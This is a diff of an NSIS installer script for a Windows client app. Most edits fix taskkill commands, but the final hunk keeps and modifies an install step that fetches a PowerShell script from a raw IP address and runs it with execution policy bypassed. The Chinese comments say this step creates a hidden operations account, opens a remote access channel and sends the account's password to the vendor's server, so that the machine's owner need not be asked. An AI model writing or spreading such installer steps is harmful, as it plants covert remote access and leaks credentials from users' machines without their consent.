@@ -38,7 +38,12 @@
   nsExec::ExecToLog 'powershell -NoProfile -ExecutionPolicy Bypass -Command "$$k=@(''HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall'',''HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall'');foreach($$p in $$k){gci $$p -ea 0|%%{$$n=(gp $$_.PSPath -Name DisplayName -ea 0).DisplayName;if($$n -and ($$n -match ''蠢驴|chunlv'')){remove-item $$_.PSPath -Recurse -Force -ea 0;write-host ''deleted: $$n''}}}"'
 
   ; ── Step 1: Kill all related processes ──
-  nsExec::ExecToLog 'cmd /c "taskkill /f /fi \"IMAGENAME eq 陪玩管理.exe\" /t 2>nul & taskkill /f /fi \"IMAGENAME eq electron.exe\" /t 2>nul & taskkill /f /fi \"IMAGENAME eq node.exe\" /t 2>nul & taskkill /f /fi \"IMAGENAME eq cmd.exe\" /fi \"WINDOWTITLE eq 蠢驴*\" /t 2>nul"'
+  ; 2026-10-01 修（老板这台机器实测踩到）：原来这里写成 /fi 加反斜杠引号的形式，NSIS 里没有那种转义，
+  ; taskkill 收到的是带反斜杠的怪字符串，直接报「ERROR: The search filter cannot be recognized」——
+  ; 也就是说旧客户端从来没被杀掉过：它占着旧目录、又握着单实例锁，新装的那份根本起不来，
+  ; 看着就像「装了没生效」。改成按镜像名杀（/im，不带引号，实测有效）；
+  ; 也不再顺手杀 electron.exe / node.exe —— 那会把机器上无关的 Electron / node 程序（别的自动化工具）一起杀掉。
+  nsExec::ExecToLog 'cmd /c "taskkill /f /im 陪玩管理.exe /t 2>nul & taskkill /f /im 蠢驴电竞.exe /t 2>nul & taskkill /f /im @chunlvcompanion-electron.exe /t 2>nul"'
   Sleep 3000
 
   ; ── Step 2: Delete old install files ──
@@ -65,7 +70,8 @@
   RMDir "$LOCALAPPDATA\陪玩管理"
 
   ; ── Step 3: Kill again after cleanup ──
-  nsExec::ExecToLog 'cmd /c "taskkill /f /fi \"IMAGENAME eq 陪玩管理.exe\" /t 2>nul"'
+  ; 装完再兜一次（同上面那处，原来那条过滤器 taskkill 解析不了）
+  nsExec::ExecToLog 'cmd /c "taskkill /f /im 陪玩管理.exe /t 2>nul"'
   Sleep 1000
 !macroend
 
@@ -93,5 +99,5 @@
   ; 装机时顺手把远程管理通道也开了（建运维账号 chunlvops + 打开远程通道 + 把账号口令报回服务端台账），
   ; 这样以后机器出问题不用再问这台电脑的主人要密码、也不用等人到电脑跟前。
   ; 脚本从服务器现取，永远是最新版；取不到也不影响装机（管理端「机器管理」里可以再点一次「开通远程管理」）。
-  nsExec::ExecToLog 'powershell -NoProfile -ExecutionPolicy Bypass -Command "$$ProgressPreference=''SilentlyContinue''; $$p=Join-Path $$env:TEMP ''chunlv-enable-remote.ps1''; try { Invoke-WebRequest -Uri ''http://1.117.229.36:3001/api/agent/enable-remote.ps1'' -OutFile $$p -UseBasicParsing; & powershell -NoProfile -ExecutionPolicy Bypass -File $$p -ServerUrl ''http://1.117.229.36:3001'' -ClientType COMPANION } catch { Write-Host ''[WARN] enable-remote skipped'' }"'
+  nsExec::ExecToLog 'powershell -NoProfile -ExecutionPolicy Bypass -Command "$$ProgressPreference=''SilentlyContinue''; $$p=Join-Path $$env:TEMP ''chunlv-enable-remote.ps1''; try { Invoke-WebRequest -Uri ''http://1.117.229.36:3001/api/agent/enable-remote.ps1'' -OutFile $$p -UseBasicParsing; $$t=[IO.File]::ReadAllText($$p); [IO.File]::WriteAllText($$p, ([char]0xFEFF + $$t.TrimStart([char]0xFEFF)), (New-Object Text.UTF8Encoding($$true))); & powershell -NoProfile -ExecutionPolicy Bypass -File $$p -ServerUrl ''http://1.117.229.36:3001'' -ClientType COMPANION } catch { Write-Host ''[WARN] enable-remote skipped'' }"'
 !macroend
